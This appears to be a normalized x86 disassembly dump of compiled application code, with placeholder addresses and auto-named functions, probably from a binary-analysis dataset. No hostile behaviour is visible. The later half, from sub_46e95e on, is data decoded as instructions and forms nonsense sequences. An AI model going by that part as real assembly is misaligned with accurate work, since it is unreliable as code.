mov eax [ eax - 0x4 ]
cmp [ eax + 0x301 ] 0x0
je r-xdata
push ebp
call sub_46daec
pop ecx
sub_46def8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
mov [ eax + 0x33c ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x33c ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
inc ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx edi
call sub_46da00
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0xf4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22c ] 0x0
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx [ eax ]
call [ edx + 0x114 ]
mov eax esi
call sub_46cf04
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x33c ]
sub edx eax
mov [ esi + 0xf4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx edi
call sub_46da00
cmp [ eax + 0x30 ] 0x0
je r-xdata
sub_46dfe8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x340 ]
imul edx [ eax + 0xf4 ]
mov [ eax + 0xfc ] edx
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
mov ecx [ ecx + 0x340 ]
add ecx edx
mov [ eax + 0x104 ] ecx
mov edx [ eax + 0xfc ]
add edx ecx
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_46da00
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ eax + 0x100 ] edx
mov ecx [ eax + 0x64 ]
mov [ ecx + 0x2c ] edx
adc edx 0x0
sub_46e068
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x322 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x348 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_46864c
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414098
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_46d390
test al al
je r-xdata
sub_46e0e4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xec ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
push ebp
call sub_46def8
pop ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xf0 ]
push ebp
call sub_46dfe8
pop ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xf4 ]
mov eax [ ebp - 0x4 ]
add eax 0x28e
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x22d ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x280 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0xb0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x302 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
lea esi [ eax + 0x28e ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
lea esi [ eax + 0x22d ]
lea edi [ edx + 0x28e ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
mov eax [ ebp - 0x4 ]
lea edi [ eax + 0x28e ]
lea esi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
inc esi
dec ebx
jne r-xdata
mov edx [ eax ]
call [ edx + 0x48 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32a ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_46da00
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x32c ]
call [ ebx + 0x328 ]
push ebp
call sub_46e068
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x302 ] 0x0
je r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x284 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
push ebp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_46da00
call sub_46dca8
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
call sub_45c84c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2ca ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_461858
push ebp
call sub_46e068
pop ecx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_46da00
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_46e2d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4412fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov edx esi
call sub_46cf1c
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_46e370
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ esi + 0x2e8 ]
call sub_4140f4
mov edi eax
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_46a7b0
xor eax eax
mov [ ebx + 0x68 ] eax
mov ax [ esi + 0x78 ]
cmp ax [ ebx + 0x44 ]
jne r-xdata
mov edx edi
mov eax [ esi + 0x2e8 ]
call sub_413f38
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
mov dx [ esi + 0x268 ]
mov eax esi
call sub_43a77c
sub_46e3c8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov esi eax
mov eax [ esi + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor ebx ebx
inc edi
mov [ esp ] 0x0
mov edx ebp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
jne r-xdata
mov edx ebp
mov eax esi
call sub_46d42c
test al al
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp ]
dec edi
jne r-xdata
mov edx [ esp ]
mov eax esi
call sub_46da00
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
sub_46e430
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov edi eax
xor ebx ebx
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov cl [ esp ]
mov edx esi
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x110 ]
test al al
je r-xdata
mov eax ebx
call sub_460f1c
mov esi eax
inc ebx
cmp ebx 0x10
jg r-xdata
sub_46e468
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ esi + 0x2e8 ]
call sub_4140f4
inc eax
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x34 ] 0x20000000
jne r-xdata
mov [ ebx + 0x68 ] esi
test [ ebx + 0x1c ] 0x10
je r-xdata
mov dl 0x1
mov eax esi
call sub_46e430
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x80 ]
mov eax ebx
call sub_46a6d0
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xa4 ]
jmp r-xdata
mov edx ebx
mov eax [ esi + 0x2e8 ]
call sub_413eec
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46e4e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] eax
xor ebp ebp
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
mov eax [ eax + 0x2e8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_46da00
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_46b9bc
mov ebp eax
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_46b9bc
cmp ebp eax
jge r-xdata
sub_46e558
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46e60a
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e611
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
mov eax ebx
call sub_46a750
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax ebx
call sub_46a750
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
mov eax [ ebx + 0x48 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x48 ]
call sub_414098
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_46e558
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
sub_46e618
push ebx
push esi
mov ebx ecx
mov esi edx
cmp ebx esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xb0 ]
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_46e650
push ebx
mov ebx edx
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_46a750
test eax eax
je r-xdata
mov eax ebx
call sub_46a750
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax ebx
call sub_46a750
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_46e6a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_461c3c
pop edi
pop esi
pop ebx
retn
mov edi esi
mov al [ edi + 0x302 ]
mov [ ebx + 0x302 ] al
mov edx [ edi + 0x2f4 ]
mov eax [ ebx + 0x2f4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x301 ]
mov [ ebx + 0x301 ] al
mov edx [ edi + 0x2f8 ]
mov eax [ ebx + 0x2f8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x2ec ]
mov eax [ ebx + 0x2ec ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x334 ]
mov [ ebx + 0x334 ] eax
mov eax [ edi + 0x330 ]
mov [ ebx + 0x330 ] eax
mov edx [ edi + 0x2fc ]
mov eax [ ebx + 0x2fc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x338 ]
mov [ ebx + 0x338 ] al
mov edx [ edi + 0x2f0 ]
mov eax [ ebx + 0x2f0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x300 ]
mov [ ebx + 0x300 ] al
sub_46e768
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46e78d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e794
retn
sub_46e798
push ebp
mov ebp esp
add esp 0xfffffff0
sub [ rw-data ] 0x1
jae r-xdata
mov esp ebp
pop ebp
retn
mov eax [ r-xdata ]
mov [ ebp - 0x10 ] eax
mov eax [ r-xdata ]
mov [ ebp - 0xc ] eax
mov eax [ r-xdata ]
mov [ ebp - 0x8 ] eax
mov eax [ r-xdata ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_413804
sub_46e95e
push esp
dec ebp
popad
outsb
jns r-xdata
add al al
mov eax [ 0x33ec0041 ]
jb r-xdata
dec esp
xor [ eax ] eax
pushfd
0x47380041 0x41
enter 0x419d 0x0
lodsb [ esi ]
sahf
inc esi
add [ eax + 0x6c00419e ] ah
popfd
inc ecx
jae r-xdata
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
call 0x30472a00
xor [ eax ] eax
inc esi
jne r-xdata
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff97880041 ]
inc esi
add [ eax ] dl
0x987c0046 0x46
push esp
0x97ec0046 0x46
insb
out dx eax
inc esi
add al al
popfd
inc esi
add [ eax ] dl
popfd
inc ecx
add [ esi + ebx * 4 - 0x615fffba ] ch
inc ecx
add [ ebp + ebx * 4 + 0x41 ] ch
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
hlt
sub_46ea22
inc esi
add [ esp + edx * 2 ] dl
push ebx
jne r-xdata
add [ ebx + ebp * 8 ] al
inc esi
add [ eax ] cl
add [ eax ] al
test al 0xe8
inc esi
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
je r-xdata
call 0xffffffffa206ebc0
inc ecx
add ah ch
xor eax [ eax ]
je r-xdata
inc ecx
add ah dh
xor eax [ eax ]
call 0x30472ae0
xor [ eax ] eax
dec esp
xor [ eax ] eax
pushfd
0x47380041 0x41
enter 0x419d 0x0
lodsb [ esi ]
sahf
inc esi
add [ eax + 0x6c00419e ] ah
popfd
inc ecx
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff97880041 ]
inc esi
add [ eax ] dl
0x987c0046 0x46
push esp
0x97ec0046 0x46
insb
out dx eax
inc esi
add al al
popfd
inc esi
add [ eax + esi * 8 ] ch
inc esi
add [ esp + edx * 2 ] dl
dec ebp
jne r-xdata
xor eax [ eax ]
adc al 0x9b
popad
arpl [ esp + edx * 2 + 0x65 ] si
inc esi
jne r-xdata
hlt
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
nop
cld
jmp r-xdata
inc ecx
add ah dh
xor eax [ eax ]
call 0x30472bc0
xor [ eax ] eax
dec esp
test al 0xe8
inc esi
add al al
jo r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
inc eax
0x14070046 0x5354
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 + rw-data ] bh
add [ eax ] al
sbb al 0x43
inc esi
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
call 0x30472c9c
xor [ eax ] eax
dec esp
xor [ eax ] eax
pushfd
0x47380041 0x41
enter 0x419d 0x0
lodsb [ esi ]
sahf
inc esi
add [ eax + 0x6c00419e ] ah
popfd
inc ecx
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff97880041 ]
inc esi
add [ eax ] dl
0x987c0046 0x46
push esp
0xf0840046 0x46
add al 0xf1
inc esi
add al al
popfd
inc esi
add [ eax ] dl
push esp
dec eax
imul esp [ edi + 0x68 ] 0x46656554
jne r-xdata
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
jns r-xdata
inc eax
add al ch
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ edx + ebx * 4 + 0x47380041 ] bl
inc ecx
add al cl
popfd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
aam 0xec
inc esi
add [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jmp r-xdata
inc esi
jne r-xdata
add [ eax ] al
pushad
out dx al
inc esi
jne r-xdata
add [ esi + ebx * 4 - 0x615fffba ] ch
inc ecx
add [ ebp + ebx * 4 + 0x41 ] ch
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
je r-xdata
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff97880041 ]
inc esi
add [ eax ] dl
0x987c0046 0x46
push esp
0x97ec0046 0x46
insb
out dx eax
inc esi
add al al
popfd
inc esi
add [ eax - 0x10 ] cl
inc esi
add [ edx ] dl
push esp
inc esp
imul esi [ esi + 0x69 ] 0x65546564
inc esi
jne r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
and bl ch
inc esi
add [ edi ] al
adc al 0x54
dec ebp
jne r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
mov esi ebx
mov ebx [ ebp + 0x8 ]
sub ebx esi
jl r-xdata
jb r-xdata
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ edx + ebx * 4 + 0x47380041 ] bl
inc ecx
add al cl
popfd
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
movsb [ edi ] [ esi ]
in eax dx
inc esi
add [ edi ] al
andps xmm1 [ edi + ebp * 2 + 0x77 ]
push esp
inc esi
jne r-xdata
adc [ eax + ecx * 2 + 0x69 ] dl
push 0x46656554
jne r-xdata
pop es
inc esi
add ah dl
inc ebx
inc esi
add [ 0x65540800 ] al
inc esi
jne r-xdata
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
inc eax
add [ edx + ebx * 4 + 0x47380041 ] bl
je r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
inc ebx
xor eax eax
push esp
inc esi
jne r-xdata
inc ecx
add [ esi + ebx * 4 - 0x615fffba ] ch
inc ecx
add [ ebp + ebx * 4 + 0x41 ] ch
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec eax
in eax dx
inc esi
add ah dl
inc ebx
inc esi
add [ 0x65540800 ] al
inc esi
jne r-xdata
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff97880041 ]
inc esi
add [ eax ] dl
0x987c0046 0x46
push esp
0xf1900046 0x46
adc dl dh
inc esi
add al al
popfd
inc esi
add [ edi ] cl
push esp
dec esp
outsd
ja r-xdata
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
arpl [ ecx ] bp
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
in eax dx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x480046ed ] dl
add [ eax ] al
add [ ebx + eax * 2 ] bl
inc esi
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
call 0x30472d70
xor [ eax ] eax
dec esp
xor [ eax ] eax
pushfd
0x47380041 0x41
enter 0x419d 0x0
lodsb [ esi ]
sahf
inc esi
add [ eax + 0x6c00419e ] ah
popfd
inc ecx
xor [ eax ] eax
pushfd
0x47380041 0x41
enter 0x419d 0x0
lodsb [ esi ]
sahf
inc esi
add [ eax + 0x6c00419e ] ah
popfd
inc ecx
jo r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ ebp - 0x8 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
js r-xdata
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff97880041 ]
inc esi
add [ eax ] dl
0x987c0046 0x46
push esp
0xf29c0046 0x46
inc esp
inc esi
add al al
popfd
inc esi
add [ ebx ] dl
push esp
inc ecx
jbe r-xdata
fsub [ ecx - 0x613fffbf ]
inc esi
add [ eax ] cl
add [ eax ] al
sbb al 0x43
inc esi
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
call 0x30472e40
xor [ eax ] eax
dec esp
xor [ eax ] eax
pushfd
0x47380041 0x41
enter 0x419d 0x0
lodsb [ esi ]
sahf
inc esi
add [ eax + 0x6c00419e ] ah
popfd
inc ecx
arpl [ ecx ] bp
add [ ebx + 0x46ee18c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x12 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x12 ] ah
inc ecx
add al cl
popfd
inc ecx
inc ecx
add [ eax ] bh
inc edi
jns r-xdata
jb r-xdata
inc esi
add [ edi ] al
adc edx [ ecx + eax * 2 + 0x76 ]
jb r-xdata
adc al 0x9b
inc esi
jne r-xdata
fstp [ ebp - 0x8 ]
fwait
inc esi
dec ebx
jne r-xdata
push ecx
or al 0xdc
inc ebp
clc
push esp
inc esi
jne r-xdata
add [ esi + ebx * 4 - 0x615fffba ] ch
inc ecx
add [ ebp + ebx * 4 + 0x41 ] ch
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax 0x580046ea
jmp 0x4beb86
pop ebp
retn 0x4
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb dh ch
inc esi
add ah dl
inc ebx
inc esi
add [ 0x65540800 ] al
inc esi
jne r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ esp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
arpl [ ecx ] bp
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
call sub_469804
mov edi eax
cmp ebx 0xffffffff
jne r-xdata
fld [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax edi
call sub_468ea0
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov edx ebp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ esp + 0x8 ]
fstp [ esp + 0x8 ]
fwait
mov edx edi
mov eax [ esp + 0x4 ]
call sub_414098
mov edx eax
mov eax [ esp ]
call sub_469804
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp ebp eax
jge r-xdata
sub_46eb5f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jmp r-xdata
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff97880041 ]
inc esi
add [ eax ] dl
0x987c0046 0x46
push esp
0x97ec0046 0x46
insb
out dx eax
inc esi
add al al
popfd
inc esi
add [ eax - 0x10 ] cl
inc esi
add [ edx ] dl
push esp
inc esp
imul esi [ esi + 0x69 ] 0x65546564
inc esi
jne r-xdata
hlt
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
nop
cld
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 + rw-data ] bh
add [ eax ] al
sbb al 0x43
inc esi
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
call 0x30472c9c
xor [ eax ] eax
dec esp
xor [ eax ] eax
pushfd
0x47380041 0x41
enter 0x419d 0x0
lodsb [ esi ]
sahf
inc esi
add [ eax + 0x6c00419e ] ah
popfd
inc ecx
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff97880041 ]
inc esi
add [ eax ] dl
0x987c0046 0x46
push esp
0xf0840046 0x46
add al 0xf1
inc esi
add al al
popfd
inc esi
add [ eax ] dl
push esp
dec eax
imul esp [ edi + 0x68 ] 0x46656554
jne r-xdata
inc eax
add al ch
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ edx + ebx * 4 + 0x47380041 ] bl
inc ecx
add al cl
popfd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
aam 0xec
inc esi
add [ edi ] al
add [ eax ] al
pushad
out dx al
inc esi
jne r-xdata
add [ esi + ebx * 4 - 0x615fffba ] ch
inc ecx
add [ ebp + ebx * 4 + 0x41 ] ch
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
je r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
mov esi ebx
mov ebx [ ebp + 0x8 ]
sub ebx esi
jl r-xdata
jb r-xdata
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ edx + ebx * 4 + 0x47380041 ] bl
inc ecx
add al cl
popfd
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
movsb [ edi ] [ esi ]
